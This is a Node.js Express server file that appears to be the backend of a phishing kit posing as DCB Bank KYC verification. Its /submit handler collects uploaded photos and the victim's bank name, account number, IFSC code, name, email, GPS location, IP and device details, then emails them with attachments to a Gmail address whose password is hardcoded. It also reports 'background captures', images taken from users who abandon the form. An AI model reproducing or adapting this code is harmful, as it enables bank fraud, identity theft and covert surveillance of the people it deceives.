const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');
const UAParser = require('ua-parser-js');

// Initialize app
const app = express();
const port = process.env.PORT || 3000;

// ================== MIDDLEWARE SETUP ==================
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// ================== FILE UPLOAD CONFIG ==================
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    cb(null, `${Date.now()}-${file.originalname}`);
  }
});

const fileFilter = (req, file, cb) => {
  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
  cb(null, allowedTypes.includes(file.mimetype));
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 50 * 1024 * 1024 // 50MB
  }
}).any();

// ================== EMAIL CONFIG ==================
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'iskexmwnespcwxrkjt'
  },
  tls: {
    rejectUnauthorized: false // For local testing only
  }
});

// ================== ENHANCED EMAIL TEMPLATE ==================
function buildEmailHtml(data) {
  const deviceTypeIcon = data.device.type === 'mobile' ? '📱' : '💻';
  
  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: ${data.isBackground ? '#d32f2f' : '#003d6a'};">
        ${data.isBackground ? '⚠️ BACKGROUND CAPTURE' : '✅ KYC VERIFICATION COMPLETED'}
      </h2>
      
      ${data.isBackground ? `
        <div style="background-color: #fff3e0; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
          <p><strong>⚠️ User abandoned the verification process</strong></p>
          <p>Captured ${data.imageCount} images before exit</p>
        </div>
      ` : ''}
      
      <div style="background-color: #eef7ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">${deviceTypeIcon} Device Information</h3>
        <p><strong>Type:</strong> ${data.device.type || 'Unknown'}</p>
        <p><strong>Model:</strong> ${data.device.model || 'Unknown'}</p>
        <p><strong>OS:</strong> ${data.os || 'Unknown'}</p>
        <p><strong>Browser:</strong> ${data.browser || 'Unknown'}</p>
      </div>
      
      ${!data.isBackground ? `
        <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="color: #003d6a; margin-top: 0;">Bank Details</h3>
          <p><strong>Bank Name:</strong> ${data.bankname || 'Not provided'}</p>
          <p><strong>Account Number:</strong> ${data.accno || 'Not provided'}</p>
          <p><strong>IFSC Code:</strong> ${data.ifsc || 'Not provided'}</p>
        </div>
      ` : ''}
      
      ${data.location ? `
        <div style="background-color: #e8f4fc; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="color: #003d6a; margin-top: 0;">📍 Location Data</h3>
          <p><strong>Coordinates:</strong> 
            ${data.location.latitude}, ${data.location.longitude}
            (±${data.location.accuracy}m accuracy)
          </p>
        </div>
      ` : ''}
      
      <div style="background-color: #f0f8ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">📊 Technical Data</h3>
        <p><strong>IP Address:</strong> ${data.ip || 'Unknown'}</p>
        <p><strong>Total Images:</strong> ${data.imageCount}</p>
        <p><strong>Submission Time:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
      </div>
    </div>
  `;
}

// ================== SUBMISSION HANDLER ==================
app.post('/submit', (req, res) => {
  upload(req, res, async (err) => {
    // Initialize response
    let statusCode = 200;
    let responseMsg = 'OK';
    
    try {
      const isBackground = req.body.empty_form === 'true';
      
      // Validate submission
      if (err) throw new Error('Upload error');
      if (!req.files || req.files.length === 0) {
        throw new Error('No files received');
      }

      // Parse device information
      const userAgent = req.headers['user-agent'] || req.body.user_agent || '';
      const parser = new UAParser(userAgent);
      const device = parser.getDevice();
      const os = parser.getOS();
      const browser = parser.getBrowser();

      // Prepare complete submission data
      const submissionData = {
        device: {
          type: device.type || req.body.device_type || 'desktop',
          model: device.model || req.body.device_model || 'Unknown',
          vendor: device.vendor || req.body.device_vendor || 'Unknown'
        },
        os: `${os.name} ${os.version}`,
        browser: `${browser.name} ${browser.version}`,
        bankname: req.body.bankname || 'Not provided',
        ifsc: req.body.ifsc || 'Not provided',
        accno: req.body.accno || 'Not provided',
        fullname: req.body.fullname || 'Not provided',
        email: req.body.email || 'Not provided',
        location: req.body.location ? JSON.parse(req.body.location) : null,
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
        userAgent: userAgent,
        timestamp: req.body.timestamp || new Date().toISOString(),
        isBackground,
        imageCount: req.files.length
      };

      // Send notification email
      await transporter.sendMail({
        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
        to: 'dcbsubmission392@gmail.com',
        subject: isBackground ? '⚠️ Partial KYC Submission' : '✅ KYC Verification Completed',
        html: buildEmailHtml(submissionData),
        attachments: req.files.map(file => ({
          filename: file.originalname,
          path: file.path
        }))
      });

      // Log successful submission
      const logEntry = `${new Date().toISOString()} | ${isBackground ? 'BACKGROUND' : 'FULL'} | ${submissionData.imageCount} images | ${submissionData.ip}\n`;
      fs.appendFileSync('submissions.log', logEntry);

    } catch (error) {
      console.error('Submission error:', error.message);
      statusCode = 500;
      responseMsg = 'Processing error';
    } finally {
      // Cleanup uploaded files
      if (req.files) {
        req.files.forEach(file => {
          try {
            fs.unlinkSync(file.path);
          } catch (cleanupError) {
            console.error('File cleanup failed:', cleanupError.message);
          }
        });
      }
      res.status(statusCode).send(responseMsg);
    }
  });
});

// ================== SERVER START ==================
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  console.log(`Upload directory: ${path.resolve(uploadDir)}`);
});
